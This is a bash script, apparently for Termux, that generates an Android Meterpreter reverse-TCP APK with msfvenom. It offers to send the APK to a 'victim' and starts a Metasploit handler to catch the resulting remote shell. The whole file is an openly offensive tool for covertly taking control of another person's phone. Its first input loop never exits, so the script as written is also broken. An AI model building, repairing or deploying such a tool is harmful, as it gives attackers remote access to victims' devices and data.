#!/bin/bash
PWD=$(pwd)
echo
while true
do
printf "\e[1;31mYou are generating payload for (LAN/WAN) ==> \e[1;92m"
read lwan
printf "\n"
if [[ $lwan == LAN ]] || [[ $lwan == lan ]]; then
printf "\e[1;31mEnter LHOST==>\e[0m "
read lht
echo
printf "\e[1;31mEnter LPORT==>\e[0m "
read lpt
elif [[ $lwan == WAN ]] || [[ $lwan == wan ]]; then
printf "\e[1;31mEnter forwarded HOST==>\e[0m "
read flht
echo
printf "\e[1;31mEnter forwarded PORT==>\e[0m "
read flpt
echo
printf "\e[1;31mEnter LPORT==>\e[0m "
read lpt
else
printf "\e[1;31mERROR: PLEASE ENTER A VALID OPTION FROM (LAN/lan) and (WAN/wan)\e[0m\n"
echo
fi
done
printf "\n"
printf "\e[1;31mEnter a name for your payload==>\e[0m "
read pld
printf "\n"
printf "\e[1;94mProcessing\e[0m"
printf "\e[1;94m.\e[0m"
sleep 0.3
printf "\e[1;94m.\e[0m"
sleep 0.3
printf "\e[1;94m.\e[0m"
sleep 0.3
printf "\e[1;94m.\e[0m"
sleep 0.3
printf "\e[1;94m.\e[0m\n"
sleep 0.3
printf "\n"
if [[ $lwan == LAN ]] || [[ $lwan == lan ]]; then
msfvenom -p android/meterpreter/reverse_tcp LHOST=$lht LPORT=$lpt R>${pld}.apk /sdcard
elif [[ $lwan == WAN ]] || [[ $lwan == wan ]]; then
msfvenom -p android/meterpreter/reverse_tcp LHOST=$flht LPORT=$flpt R>${pld}.apk /sdcard
fi
sleep 5
cd $PWD
mv -v ${pld}.apk /sdcard
sleep 0.5
printf "\n"

printf "\e[1;33m\e[104mChoose any from option:-\e[0m\n"
echo
while true; do
printf "\e[1;32m01. Send the payload to your victim\e[om\n"
printf "\e[1;32m02. Install payload in this device\e[0m\n"
printf "\e[1;32m03. Start exploit\e[0m\n"
printf "\e[1;32m04. Remove the apk\e[0m\n"
printf "\e[1;32m>>Run 'quit' to exit\e[0m\n"
echo
printf "\e[1;36mEnter your option==> \e[1;32m"
read option
echo
if [[ $option == 1 ]] || [[ $option == 01 ]]
then
cd /sdcard && xdg-open --send ${pld}.apk
cd $PWD
elif [[ $option == 2 ]] || [[ $option == 02 ]]
then
cd /sdcard && xdg-open ${pld}.apk
cd $PWD
elif [[ $option == 3 ]] || [[ $option == 03 ]]
then
mkdir -p $PREFIX/tmp
cd $PREFIX/tmp
echo "use exploit/multi/handler" > run
echo "set payload android/meterpreter/reverse_tcp" >> run
if [[ $lwan == LAN ]] || [[ $lwan == lan ]]; then
echo "set lhost $lht" >> run
elif [[ $lwan == WAN ]] || [[ $lwan == wan ]]; then
echo "set lhost $flht" >> run
fi
echo "set lport $lpt" >> run
echo "show options" >> run
echo "exploit" >> run
msfconsole -r run
cd - &> /dev/null
cd $PWD
elif [[ $option == 4 ]] || [[ $option == 04 ]]
then
cd $HOME && cd /sdcard && rm -rf ${pld}.apk
cd $PWD
elif [[ $option == quit ]]
then
unset PWD
exit
else
printf "\e[1;31m>>>please choose a valid option\e[0m\n"
fi
done

